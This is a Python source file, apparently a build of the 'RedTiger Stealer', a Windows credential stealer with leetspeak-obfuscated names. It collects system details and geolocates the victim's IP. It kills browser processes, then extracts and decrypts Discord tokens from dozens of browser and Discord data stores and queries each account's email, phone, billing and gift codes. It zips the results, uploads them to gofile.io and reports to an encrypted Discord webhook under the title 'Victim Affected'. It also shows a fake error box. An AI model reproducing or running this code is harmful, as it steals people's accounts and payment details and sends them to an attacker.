
import sys

def D3f_V3rific4ti0n():
    def D3f_On1yW1nd0w5():
        if sys.platform.startswith("win"):
            return False
        else:
            return True
    
    try: 
        v4r_status = D3f_On1yW1nd0w5()
        if v4r_status == True:
            return v4r_status
    except:
        return True
    
if D3f_V3rific4ti0n() == True:
    sys.exit()
    
import os
import socket
import win32api
import requests
import base64
import ctypes
import threading
import discord
import zipfile
import io
from json import loads
from urllib.request import urlopen
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.backends import default_backend

def D3f_Sy5t3mInf0(v4r_zip_file): 
    v4r_status_system_info = None
    return v4r_status_system_info

def D3f_R0b10xAccount(v4r_zip_file):
    v4r_number_roblox_account = None
    return v4r_number_roblox_account

def D3f_Di5c0rdAccount(v4r_zip_file):
    v4r_number_discord_account = None
    return v4r_number_discord_account

def D3f_Di5c0rdInj3c710n(): 
    v4r_number_discord_injection = None
    return v4r_number_discord_injection

def D3f_Br0w53r5t341(v4r_zip_file): 
    v4r_number_extentions = None
    v4r_number_passwords = None
    v4r_number_cookies = None
    v4r_number_history = None
    v4r_number_downloads = None
    v4r_number_cards = None
    return v4r_number_extentions, v4r_number_passwords, v4r_number_cookies, v4r_number_history, v4r_number_downloads, v4r_number_cards

def D3f_S3ssi0nFil3s(v4r_zip_file):
    v4r_name_wallets = None
    v4r_name_game_launchers = None
    v4r_name_apps = None
    return v4r_name_wallets, v4r_name_game_launchers, v4r_name_apps

def D3f_Int3r3stingFil3s(v4r_zip_file):
    v4r_number_files = None
    return v4r_number_files

def D3f_W3bc4m(v4r_zip_file):
    v4r_status_camera_capture = None
    return v4r_status_camera_capture

def D3f_Scr33n5h0t(v4r_zip_file): 
    v4r_number_screenshot = None
    return v4r_number_screenshot

def D3f_St4rtup(): pass
def D3f_R3st4rt(): pass
def D3f_B10ckK3y(): pass
def D3f_Unb10ckK3y(): pass
def D3f_B10ckT45kM4n4g3r(): pass
def D3f_B10ckM0u53(): pass
def D3f_B10ckW3b5it3(): pass
def D3f_F4k33rr0r(): pass
def D3f_Sp4m0p3nPr0gr4m(): pass
def D3f_Sp4mCr34tFil3(): pass
def D3f_Shutd0wn(): pass
def D3f_Sp4m_Opti0ns(): pass

def D3f_Title(title):
    try:
        if sys.platform.startswith("win"):
            ctypes.windll.kernel32.SetConsoleTitleW(title)
        elif sys.platform.startswith("linux"):
            sys.stdout.write(f"\x1b]2;{title}\x07")
    except:
        pass
        
def D3f_Clear():
    try:
        if sys.platform.startswith("win"):
            os.system("cls")
        elif sys.platform.startswith("linux"):
            os.system("clear")
    except:
        pass

def D3f_Decrypt(v4r_encrypted, v4r_key):
    def D3f_DeriveKey(v4r_password, v4r_salt):
        v4r_kdf = PBKDF2HMAC(algorithm=hashes.SHA256(), length=32, salt=v4r_salt, iterations=100000, backend=default_backend())
        if isinstance(v4r_password, str):  
            v4r_password = v4r_password.encode()  
        return v4r_kdf.derive(v4r_password)

    v4r_encrypted_data = base64.b64decode(v4r_encrypted)
    v4r_salt = v4r_encrypted_data[:16]
    v4r_iv = v4r_encrypted_data[16:32]
    v4r_encrypted_data = v4r_encrypted_data[32:]
    v4r_derived_key = D3f_DeriveKey(v4r_key, v4r_salt)
    v4r_cipher = Cipher(algorithms.AES(v4r_derived_key), modes.CBC(v4r_iv), backend=default_backend())
    v4r_decryptor = v4r_cipher.decryptor()
    v4r_decrypted_data = v4r_decryptor.update(v4r_encrypted_data) + v4r_decryptor.finalize()
    v4r_unpadder = padding.PKCS7(128).unpadder()
    v4r_original_data = v4r_unpadder.update(v4r_decrypted_data) + v4r_unpadder.finalize()
    return v4r_original_data.decode()

D3f_Title("")

try: v4r_hostname_pc    = socket.gethostname()
except: v4r_hostname_pc = "None"

try: v4r_username_pc    = os.getlogin()
except: v4r_username_pc = "None"

try: v4r_displayname_pc    = win32api.GetUserNameEx(win32api.NameDisplay)
except: v4r_displayname_pc = "None"

try: v4r_ip_address_public    = requests.get("https://api.ipify.org?format=json").json().get("ip", "None")
except: v4r_ip_address_public = "None"

try: v4r_ip_adress_local    = socket.gethostbyname(socket.gethostname())
except: v4r_ip_adress_local = "None"

v4r_w3bh00k_ur1_crypt = r"""
1TSkGNwPVj9iEA9S1lpTiuHEJyMr7nf63XtZMgelrCWphFZ8TT7aHANqiCuOaEBIUYkJu0aiTHIbVlr0VTa4bBpjmKYCE8OW53zowPzkSYCzeDvzAIEkYBDi3hTNZimNyU6eXVDNi7QF63Exlp5MJGSMrx616CNK/zk7LjNX0RRLOhchkeUq2GHpAFG6HCfd8WGQBmMZh5H49Kz6jQRMpQ==
"""

v4r_k3y            = "LtIxzShrYxDbpBXbIEDRRqWnCtzafLQykRsboOzggCkVmUigildJuTasVwUnOMmOngppCNgZklgfhdYpFKpKoVSetVvomnLaENQeyAiGPWgqgZQxAlakDTnPrKKqTSIQyjqvKJxRCNgHNKbaQCpaOhhtApmpwECRDTyE"
v4r_website        = "redtiger.shop"
v4r_color_embed    = 0xa80505
v4r_username_embed = "RedTiger St34l3r"
v4r_avatar_embed   = "https://google.com"
v4r_footer_text    = "RedTiger St34l3r - github.com/loxy0dev/RedTiger-Tools"
v4r_footer_embed   = {"text": v4r_footer_text, "icon_url": v4r_avatar_embed}
v4r_title_embed    = f'`{v4r_username_pc} "{v4r_ip_address_public}"`'
v4r_w3bh00k_ur1    = D3f_Decrypt(v4r_w3bh00k_ur1_crypt, v4r_k3y)

v4r_path_windows           = os.getenv("WINDIR", None)
v4r_path_userprofile       = os.getenv('USERPROFILE', None)
v4r_path_appdata_local     = os.getenv('LOCALAPPDATA', None)
v4r_path_appdata_roaming   = os.getenv('APPDATA', None)
v4r_path_program_files_x86 = os.getenv('ProgramFiles(x86)', None)
if v4r_path_program_files_x86 is None:
    v4r_path_program_files_x86 = os.getenv('ProgramFiles', None)

try:
    v4r_response = requests.get(f"https://{v4r_website}/api/ip/ip={v4r_ip_address_public}")
    v4r_api = v4r_response.json()

    v4r_country = v4r_api.get('country', "None")
    v4r_country_code = v4r_api.get('country_code', "None")
    v4r_region = v4r_api.get('region', "None")
    v4r_region_code = v4r_api.get('region_code', "None")
    v4r_zip_postal = v4r_api.get('zip', "None")
    v4r_city = v4r_api.get('city', "None")
    v4r_latitude = v4r_api.get('latitude', "None")
    v4r_longitude = v4r_api.get('longitude', "None")
    v4r_timezone = v4r_api.get('timezone', "None")
    v4r_isp = v4r_api.get('isp', "None")
    v4r_org = v4r_api.get('org', "None")
    v4r_as_number = v4r_api.get('as', "None")
except:
    v4r_response = requests.get(f"http://ip-api.com/json/{v4r_ip_address_public}")
    v4r_api = v4r_response.json()

    v4r_country = v4r_api.get('country', "None")
    v4r_country_code = v4r_api.get('countryCode', "None")
    v4r_region = v4r_api.get('regionName', "None")
    v4r_region_code = v4r_api.get('region', "None")
    v4r_zip_postal = v4r_api.get('zip', "None")
    v4r_city = v4r_api.get('city', "None")
    v4r_latitude = v4r_api.get('lat', "None")
    v4r_longitude = v4r_api.get('lon', "None")
    v4r_timezone = v4r_api.get('timezone', "None")
    v4r_isp = v4r_api.get('isp', "None")
    v4r_org = v4r_api.get('org', "None")
    v4r_as_number = v4r_api.get('as', "None")

def D3f_Di5c0rdAccount(v4r_zip_file):
    import os
    import re
    import json
    import base64
    import requests
    import psutil
    from Cryptodome.Cipher import AES
    from win32crypt import CryptUnprotectData

    v4r_file_discord_account = ""
    v4r_number_discord_account = 0

    def D3f_Extr4ctT0k3n5():  
        v4r_base_url = "https://discord.com/api/v9/users/@me"
        v4r_regexp = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
        v4r_regexp_enc = r"dQw4w9WgXcQ:[^\"]*"
        v4r_t0k3n5 = []
        v4r_uids = []
        v4r_token_info = {}

        v4r_paths = [
            ("Discord",                os.path.join(v4r_path_appdata_roaming, "discord", "Local Storage", "leveldb"),                                                  ""),
            ("Discord Canary",         os.path.join(v4r_path_appdata_roaming, "discordcanary", "Local Storage", "leveldb"),                                            ""),
            ("Lightcord",              os.path.join(v4r_path_appdata_roaming, "Lightcord", "Local Storage", "leveldb"),                                                ""),
            ("Discord PTB",            os.path.join(v4r_path_appdata_roaming, "discordptb", "Local Storage", "leveldb"),                                               ""),
            ("Opera",                  os.path.join(v4r_path_appdata_roaming, "Opera Software", "Opera Stable", "Local Storage", "leveldb"),                           "opera.exe"),
            ("Opera GX",               os.path.join(v4r_path_appdata_roaming, "Opera Software", "Opera GX Stable", "Local Storage", "leveldb"),                        "opera.exe"),
            ("Opera Neon",             os.path.join(v4r_path_appdata_roaming, "Opera Software", "Opera Neon", "Local Storage", "leveldb"),                             "opera.exe"),
            ("Amigo",                  os.path.join(v4r_path_appdata_local,   "Amigo", "User Data", "Local Storage", "leveldb"),                                       "amigo.exe"),
            ("Torch",                  os.path.join(v4r_path_appdata_local,   "Torch", "User Data", "Local Storage", "leveldb"),                                       "torch.exe"),
            ("Kometa",                 os.path.join(v4r_path_appdata_local,   "Kometa", "User Data", "Local Storage", "leveldb"),                                      "kometa.exe"),
            ("Orbitum",                os.path.join(v4r_path_appdata_local,   "Orbitum", "User Data", "Local Storage", "leveldb"),                                     "orbitum.exe"),
            ("CentBrowser",            os.path.join(v4r_path_appdata_local,   "CentBrowser", "User Data", "Local Storage", "leveldb"),                                 "centbrowser.exe"),
            ("7Star",                  os.path.join(v4r_path_appdata_local,   "7Star", "7Star", "User Data", "Local Storage", "leveldb"),                              "7star.exe"),
            ("Sputnik",                os.path.join(v4r_path_appdata_local,   "Sputnik", "Sputnik", "User Data", "Local Storage", "leveldb"),                          "sputnik.exe"),
            ("Vivaldi",                os.path.join(v4r_path_appdata_local,   "Vivaldi", "User Data", "Default", "Local Storage", "leveldb"),                          "vivaldi.exe"),
            ("Google Chrome",          os.path.join(v4r_path_appdata_local,   "Google", "Chrome", "User Data", "Default", "Local Storage", "leveldb"),                 "chrome.exe"),
            ("Google Chrome",          os.path.join(v4r_path_appdata_local,   "Google", "Chrome", "User Data", "Profile 1", "Local Storage", "leveldb"),               "chrome.exe"),
            ("Google Chrome",          os.path.join(v4r_path_appdata_local,   "Google", "Chrome", "User Data", "Profile 2", "Local Storage", "leveldb"),               "chrome.exe"),
            ("Google Chrome",          os.path.join(v4r_path_appdata_local,   "Google", "Chrome", "User Data", "Profile 3", "Local Storage", "leveldb"),               "chrome.exe"),
            ("Google Chrome",          os.path.join(v4r_path_appdata_local,   "Google", "Chrome", "User Data", "Profile 4", "Local Storage", "leveldb"),               "chrome.exe"),
            ("Google Chrome",          os.path.join(v4r_path_appdata_local,   "Google", "Chrome", "User Data", "Profile 5", "Local Storage", "leveldb"),               "chrome.exe"),
            ("Google Chrome SxS",      os.path.join(v4r_path_appdata_local,   "Google", "Chrome SxS", "User Data", "Default", "Local Storage", "leveldb"),             "chrome.exe"),
            ("Google Chrome Beta",     os.path.join(v4r_path_appdata_local,   "Google", "Chrome Beta", "User Data", "Default", "Local Storage", "leveldb"),            "chrome.exe"),
            ("Google Chrome Dev",      os.path.join(v4r_path_appdata_local,   "Google", "Chrome Dev", "User Data", "Default", "Local Storage", "leveldb"),             "chrome.exe"),
            ("Google Chrome Unstable", os.path.join(v4r_path_appdata_local,   "Google", "Chrome Unstable", "User Data", "Default", "Local Storage", "leveldb"),        "chrome.exe"),
            ("Google Chrome Canary",   os.path.join(v4r_path_appdata_local,   "Google", "Chrome Canary", "User Data", "Default", "Local Storage", "leveldb"),          "chrome.exe"),
            ("Epic Privacy Browser",   os.path.join(v4r_path_appdata_local,   "Epic Privacy Browser", "User Data", "Local Storage", "leveldb"),                        "epic.exe"),
            ("Microsoft Edge",         os.path.join(v4r_path_appdata_local,   "Microsoft", "Edge", "User Data", "Default", "Local Storage", "leveldb"),                "msedge.exe"),
            ("Uran",                   os.path.join(v4r_path_appdata_local,   "uCozMedia", "Uran", "User Data", "Default", "Local Storage", "leveldb"),                "uran.exe"),
            ("Yandex",                 os.path.join(v4r_path_appdata_local,   "Yandex", "YandexBrowser", "User Data", "Default", "Local Storage", "leveldb"),          "yandex.exe"),
            ("Yandex Canary",          os.path.join(v4r_path_appdata_local,   "Yandex", "YandexBrowserCanary", "User Data", "Default", "Local Storage", "leveldb"),    "yandex.exe"),
            ("Yandex Developer",       os.path.join(v4r_path_appdata_local,   "Yandex", "YandexBrowserDeveloper", "User Data", "Default", "Local Storage", "leveldb"), "yandex.exe"),
            ("Yandex Beta",            os.path.join(v4r_path_appdata_local,   "Yandex", "YandexBrowserBeta", "User Data", "Default", "Local Storage", "leveldb"),      "yandex.exe"),
            ("Yandex Tech",            os.path.join(v4r_path_appdata_local,   "Yandex", "YandexBrowserTech", "User Data", "Default", "Local Storage", "leveldb"),      "yandex.exe"),
            ("Yandex SxS",             os.path.join(v4r_path_appdata_local,   "Yandex", "YandexBrowserSxS", "User Data", "Default", "Local Storage", "leveldb"),       "yandex.exe"),
            ("Brave",                  os.path.join(v4r_path_appdata_local,   "BraveSoftware", "Brave-Browser", "User Data", "Default", "Local Storage", "leveldb"),   "brave.exe"),
            ("Iridium",                os.path.join(v4r_path_appdata_local,   "Iridium", "User Data", "Default", "Local Storage", "leveldb"),                          "iridium.exe"),
        ]

        
        try:
             for v4r_name, v4r_path, v4r_proc_name in v4r_paths:
                for v4r_proc in psutil.process_iter(['pid', 'name']):
                    try:
                        if v4r_proc.name().lower() == v4r_proc_name.lower():
                            v4r_proc.terminate()
                    except: pass
        except: pass

        for v4r_name, v4r_path, v4r_proc_name in v4r_paths:
            if not os.path.exists(v4r_path):

                continue
            v4r__d15c0rd = v4r_name.replace(" ", "").lower()
            if "cord" in v4r_path:
                if not os.path.exists(os.path.join(v4r_path_appdata_roaming, v4r__d15c0rd, 'Local State')):
                    continue
                for v4r_file_name in os.listdir(v4r_path):
                    if v4r_file_name[-3:] not in ["log", "ldb"]:
                        continue
                    v4r_total_path = os.path.join(v4r_path, v4r_file_name)
                    if os.path.exists(v4r_total_path):
                        with open(v4r_total_path, errors='ignore') as v4r_file:
                            for v4r_line in v4r_file:
                                for y in re.findall(v4r_regexp_enc, v4r_line.strip()):
                                    v4r_t0k3n = D3f_DecryptVal(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), D3f_GetMasterKey(os.path.join(v4r_path_appdata_roaming, v4r__d15c0rd, 'Local State')))
                                    if D3f_ValidateT0k3n(v4r_t0k3n, v4r_base_url):
                                        v4r_uid = requests.get(v4r_base_url, headers={'Authorization': v4r_t0k3n}).json()['id']
                                        if v4r_uid not in v4r_uids:
                                            v4r_t0k3n5.append(v4r_t0k3n)
                                            v4r_uids.append(v4r_uid)
                                            v4r_token_info[v4r_t0k3n] = (v4r_name, v4r_total_path)
            else:
                for v4r_file_name in os.listdir(v4r_path):
                    if v4r_file_name[-3:] not in ["log", "ldb"]:
                        continue
                    v4r_total_path = os.path.join(v4r_path, v4r_file_name)
                    if os.path.exists(v4r_total_path):
                        with open(v4r_total_path, errors='ignore') as v4r_file:
                            for v4r_line in v4r_file:
                                for v4r_t0k3n in re.findall(v4r_regexp, v4r_line.strip()):
                                    if D3f_ValidateT0k3n(v4r_t0k3n, v4r_base_url):
                                        v4r_uid = requests.get(v4r_base_url, headers={'Authorization': v4r_t0k3n}).json()['id']
                                        if v4r_uid not in v4r_uids:
                                            v4r_t0k3n5.append(v4r_t0k3n)
                                            v4r_uids.append(v4r_uid)
                                            v4r_token_info[v4r_t0k3n] = (v4r_name, v4r_total_path)

        if os.path.exists(os.path.join(v4r_path_appdata_roaming, "Mozilla", "Firefox", "Profiles")):
            for v4r_path, _, v4r_files in os.walk(os.path.join(v4r_path_appdata_roaming, "Mozilla", "Firefox", "Profiles")):
                for v4r__file in v4r_files:
                    if v4r__file.endswith('.sqlite'):
                        with open(os.path.join(v4r_path, v4r__file), errors='ignore') as v4r_file:
                            for v4r_line in v4r_file:
                                for v4r_t0k3n in re.findall(v4r_regexp, v4r_line.strip()):
                                    if D3f_ValidateT0k3n(v4r_t0k3n, v4r_base_url):
                                        v4r_uid = requests.get(v4r_base_url, headers={'Authorization': v4r_t0k3n}).json()['id']
                                        if v4r_uid not in v4r_uids:
                                            v4r_t0k3n5.append(v4r_t0k3n)
                                            v4r_uids.append(v4r_uid)
                                            v4r_token_info[v4r_t0k3n] = ('Firefox', os.path.join(v4r_path, v4r__file))
        return v4r_t0k3n5, v4r_token_info

    def D3f_ValidateT0k3n(v4r_t0k3n, v4r_base_url):
        return requests.get(v4r_base_url, headers={'Authorization': v4r_t0k3n}).status_code == 200

    def D3f_DecryptVal(v4r_buff, v4r_master_key):
        v4r_iv = v4r_buff[3:15]
        v4r_payload = v4r_buff[15:]
        v4r_cipher = AES.new(v4r_master_key, AES.MODE_GCM, v4r_iv)
        return v4r_cipher.decrypt(v4r_payload)[:-16].decode()

    def D3f_GetMasterKey(v4r_path):
        if not os.path.exists(v4r_path):
            return None
        with open(v4r_path, "r", encoding="utf-8") as v4r_f:
            v4r_local_state = json.load(v4r_f)
        v4r_master_key = base64.b64decode(v4r_local_state["os_crypt"]["encrypted_key"])[5:]
        return CryptUnprotectData(v4r_master_key, None, None, None, 0)[1]

    v4r_t0k3n5, v4r_token_info = D3f_Extr4ctT0k3n5()
    
    if not v4r_t0k3n5:
        v4r_file_discord_account = "No discord tokens found."

    for v4r_t0k3n_d15c0rd in v4r_t0k3n5:
        v4r_number_discord_account += 1

        try: v4r_api = requests.get('https://discord.com/api/v8/users/@me', headers={'Authorization': v4r_t0k3n_d15c0rd}).json()
        except: v4r_api = {"None": "None"}

        v4r_u53rn4m3_d15c0rd = v4r_api.get('username', "None") + '#' + v4r_api.get('discriminator', "None")
        v4r_d15pl4y_n4m3_d15c0rd = v4r_api.get('global_name', "None")
        v4r_us3r_1d_d15c0rd = v4r_api.get('id', "None")
        v4r_em4i1_d15c0rd = v4r_api.get('email', "None")
        v4r_em4il_v3rifi3d_d15c0rd = v4r_api.get('verified', "None")
        v4r_ph0n3_d15c0rd = v4r_api.get('phone', "None")
        v4r_c0untry_d15c0rd = v4r_api.get('locale', "None")
        v4r_mf4_d15c0rd = v4r_api.get('mfa_enabled', "None")

        try:
            if v4r_api.get('premium_type', 'None') == 0:
                v4r_n1tr0_d15c0rd = 'False'
            elif v4r_api.get('premium_type', 'None') == 1:
                v4r_n1tr0_d15c0rd = 'Nitro Classic'
            elif v4r_api.get('premium_type', 'None') == 2:
                v4r_n1tr0_d15c0rd = 'Nitro Boosts'
            elif v4r_api.get('premium_type', 'None') == 3:
                v4r_n1tr0_d15c0rd = 'Nitro Basic'
            else:
                v4r_n1tr0_d15c0rd = 'False'
        except:
            v4r_n1tr0_d15c0rd = "None"

        try: v4r_av4t4r_ur1_d15c0rd = f"https://cdn.discordapp.com/avatars/{v4r_us3r_1d_d15c0rd}/{v4r_api['avatar']}.gif" if requests.get(f"https://cdn.discordapp.com/avatars/{v4r_us3r_1d_d15c0rd}/{v4r_api['avatar']}.gif").status_code == 200 else f"https://cdn.discordapp.com/avatars/{v4r_us3r_1d_d15c0rd}/{v4r_api['avatar']}.png"
        except: v4r_av4t4r_ur1_d15c0rd = "None"

        try:
            v4r_billing_discord = requests.get('https://discord.com/api/v6/users/@me/billing/payment-sources', headers={'Authorization': v4r_t0k3n_d15c0rd}).json()
            if v4r_billing_discord:
                v4r_p4ym3nt_m3th0d5_d15c0rd = []

                for v4r_method in v4r_billing_discord:
                    if v4r_method['type'] == 1:
                        v4r_p4ym3nt_m3th0d5_d15c0rd.append('Bank Card')
                    elif v4r_method['type'] == 2:
                        v4r_p4ym3nt_m3th0d5_d15c0rd.append("Paypal")
                    else:
                        v4r_p4ym3nt_m3th0d5_d15c0rd.append('Other')
                v4r_p4ym3nt_m3th0d5_d15c0rd = ' / '.join(v4r_p4ym3nt_m3th0d5_d15c0rd)
            else:
                v4r_p4ym3nt_m3th0d5_d15c0rd = "None"
        except:
            v4r_p4ym3nt_m3th0d5_d15c0rd = "None"

        try:
            v4r_gift_codes = requests.get('https://discord.com/api/v9/users/@me/outbound-promotions/codes', headers={'Authorization': v4r_t0k3n_d15c0rd}).json()
            if v4r_gift_codes:
                v4r_codes = []
                for v4r_g1ft_c0d35_d15c0rd in v4r_gift_codes:
                    v4r_name = v4r_g1ft_c0d35_d15c0rd['promotion']['outbound_title']
                    v4r_g1ft_c0d35_d15c0rd = v4r_g1ft_c0d35_d15c0rd['code']
                    v4r_data = f"Gift: \"{v4r_name}\" Code: \"{v4r_g1ft_c0d35_d15c0rd}\""
                    if len('\n\n'.join(v4r_g1ft_c0d35_d15c0rd)) + len(v4r_data) >= 1024:
                        break
                    v4r_codes.append(v4r_data)
                if len(v4r_codes) > 0:
                    v4r_g1ft_c0d35_d15c0rd = '\n\n'.join(v4r_codes)
                else:
                    v4r_g1ft_c0d35_d15c0rd = "None"
            else:
                v4r_g1ft_c0d35_d15c0rd = "None"
        except:
            v4r_g1ft_c0d35_d15c0rd = "None"
    
        try: v4r_software_name, v4r_path = v4r_token_info.get(v4r_t0k3n_d15c0rd, ("Unknown", "Unknown"))
        except: v4r_software_name, v4r_path = "Unknown", "Unknown"

        v4r_file_discord_account = v4r_file_discord_account + f"""
Discord Account n°{str(v4r_number_discord_account)}:
 - Path Found      : {v4r_path}
 - Software        : {v4r_software_name}
 - Token           : {v4r_t0k3n_d15c0rd}
 - Username        : {v4r_u53rn4m3_d15c0rd}
 - Display Name    : {v4r_d15pl4y_n4m3_d15c0rd}
 - Id              : {v4r_us3r_1d_d15c0rd}
 - Email           : {v4r_em4i1_d15c0rd}
 - Email Verified  : {v4r_em4il_v3rifi3d_d15c0rd}
 - Phone           : {v4r_ph0n3_d15c0rd}
 - Nitro           : {v4r_n1tr0_d15c0rd}
 - Language        : {v4r_c0untry_d15c0rd}
 - Billing         : {v4r_p4ym3nt_m3th0d5_d15c0rd}
 - Gift Code       : {v4r_g1ft_c0d35_d15c0rd}
 - Profile Picture : {v4r_av4t4r_ur1_d15c0rd}
 - Multi-Factor Authentication : {v4r_mf4_d15c0rd}
"""
    v4r_zip_file.writestr(f"Discord Accounts ({v4r_number_discord_account}).txt", v4r_file_discord_account)

    return v4r_number_discord_account

def D3f_F4k33rr0r():
    import tkinter as tk
    from tkinter import messagebox
    root = tk.Tk()
    root.withdraw()
    messagebox.showerror("dddd", "ddd")

v4r_option = []

v4r_zip_buffer = io.BytesIO()
with zipfile.ZipFile(v4r_zip_buffer, "w", zipfile.ZIP_DEFLATED) as v4r_zip_file:

    try: 
        v4r_number_discord_injection = D3f_Di5c0rdInj3c710n()
    except Exception as e:
        v4r_number_discord_injection = f"Error: {e}"

    try: 
        v4r_status_system_info = D3f_Sy5t3mInf0(v4r_zip_file)
    except Exception as e:
        v4r_status_system_info = f"Error: {e}"

    try: 
        v4r_number_discord_account = D3f_Di5c0rdAccount(v4r_zip_file)
    except Exception as e:
        v4r_number_discord_account = f"Error: {e}"

    try: 
        v4r_number_extentions, v4r_number_passwords, v4r_number_cookies, v4r_number_history, v4r_number_downloads, v4r_number_cards = D3f_Br0w53r5t341(v4r_zip_file)
    except Exception as e:
        v4r_number_extentions = f"Error: {e}"
        v4r_number_passwords = f"Error: {e}"
        v4r_number_cookies = f"Error: {e}"
        v4r_number_history = f"Error: {e}"
        v4r_number_downloads = f"Error: {e}"
        v4r_number_cards = f"Error: {e}"

    try: 
        v4r_number_roblox_account = D3f_R0b10xAccount(v4r_zip_file)
    except Exception as e:
        v4r_number_roblox_account = f"Error: {e}"

    try: 
        v4r_status_camera_capture = D3f_W3bc4m(v4r_zip_file)
    except Exception as e:
        v4r_status_camera_capture = f"Error: {e}"

    try: 
        v4r_status_screenshot = D3f_Scr33n5h0t(v4r_zip_file)
    except Exception as e:
        v4r_status_screenshot = f"Error: {e}"

    try: 
        v4r_name_wallets, v4r_name_game_launchers, v4r_name_apps = D3f_S3ssi0nFil3s(v4r_zip_file)
    except Exception as e:
        v4r_status_screenshot = f"Error: {e}"

    try: 
        v4r_number_files = D3f_Int3r3stingFil3s(v4r_zip_file)
    except Exception as e:
        v4r_number_files = f"Error: {e}"

    if v4r_number_discord_injection != None:
        v4r_option.append(f"Discord Injection : {v4r_number_discord_injection}")

    if v4r_status_camera_capture != None:
        v4r_option.append(f"Camera Capture    : {v4r_status_camera_capture}")

    if v4r_status_screenshot != None:
        v4r_option.append(f"Screenshot        : {v4r_status_screenshot}")

    if v4r_status_system_info != None:
        v4r_option.append(f"System Info       : {v4r_status_system_info}")

    if v4r_number_discord_account != None:
        v4r_option.append(f"Discord Accounts  : {v4r_number_discord_account}")

    if v4r_number_roblox_account != None:
        v4r_option.append(f"Roblox Accounts   : {v4r_number_roblox_account}")

    if v4r_number_passwords != None:
        v4r_option.append(f"Passwords         : {v4r_number_passwords}")

    if v4r_number_cookies != None:
        v4r_option.append(f"Cookies           : {v4r_number_cookies}")

    if v4r_number_cards != None:
        v4r_option.append(f"Cards             : {v4r_number_cards}")

    if v4r_number_history != None:
        v4r_option.append(f"Browsing History  : {v4r_number_history}")

    if v4r_number_downloads != None:
        v4r_option.append(f"Download History  : {v4r_number_downloads}")

    if v4r_number_extentions != None:
        v4r_option.append(f"Extentions        : {v4r_number_extentions}")

    if v4r_name_wallets != None:
        v4r_option.append(f"Wallets           : {v4r_name_wallets}")

    if v4r_name_game_launchers != None:
        v4r_option.append(f"Game Launchers    : {v4r_name_game_launchers}")
    
    if v4r_name_apps != None:
        v4r_option.append(f"Apps              : {v4r_name_apps}")
    
    if v4r_number_files != None:
        v4r_option.append(f"Interesting Files : {v4r_number_files}")

v4r_zip_buffer.seek(0)

try:
    try: v4r_gofileserver = loads(urlopen("https://api.gofile.io/getServer").read().decode('utf-8'))["data"]["server"]
    except: v4r_gofileserver = "store4"

    v4r_response = requests.post(
        f"https://{v4r_gofileserver}.gofile.io/uploadFile",
        files={"file": (f"RedTiger_{v4r_username_pc.replace(' ', '_')}.zip", v4r_zip_buffer)}
    )

    v4r_download_link = v4r_response.json()["data"]["downloadPage"]
except Exception as e:
    v4r_download_link = f"Error: {e}"

embed = discord.Embed(title="Victim Affected", color=v4r_color_embed
).add_field(
    inline=False,
    name="Summary of Information", 
    value=f"""```
Hostname    : {v4r_hostname_pc}
Username    : {v4r_username_pc}
DisplayName : {v4r_displayname_pc}
Ip Public   : {v4r_ip_address_public}
Ip Local    : {v4r_ip_adress_local}
Country     : {v4r_country}```"""
).add_field(
    inline=False,
    name="Stolen Information", 
    value=f"""```swift
{"\n".join(v4r_option)}```"""
).add_field(
    inline=False,
    name="Download Link", 
    value=f"""{v4r_download_link}"""
).set_footer(
    text=v4r_footer_text, 
    icon_url=v4r_avatar_embed
)

try:  
    v4r_w3bh00k = discord.SyncWebhook.from_url(v4r_w3bh00k_ur1)
    v4r_w3bh00k.send(embed=embed, username=v4r_username_embed, avatar_url=v4r_avatar_embed)
except: pass


try: threading.Thread(target=D3f_B10ckK3y).start()
except: pass
try: threading.Thread(target=D3f_B10ckT45kM4n4g3r).start()
except: pass
try: threading.Thread(target=D3f_B10ckW3b5it3).start()
except: pass
try: threading.Thread(target=D3f_St4rtup).start()
except: pass
try: threading.Thread(target=D3f_Sp4m_Opti0ns).start()
except: pass
try: threading.Thread(target=D3f_R3st4rt).start()
except: pass
try: threading.Thread(target=D3f_F4k33rr0r).start()
except: pass
try: threading.Thread(target=D3f_Shutd0wn).start()
except: pass
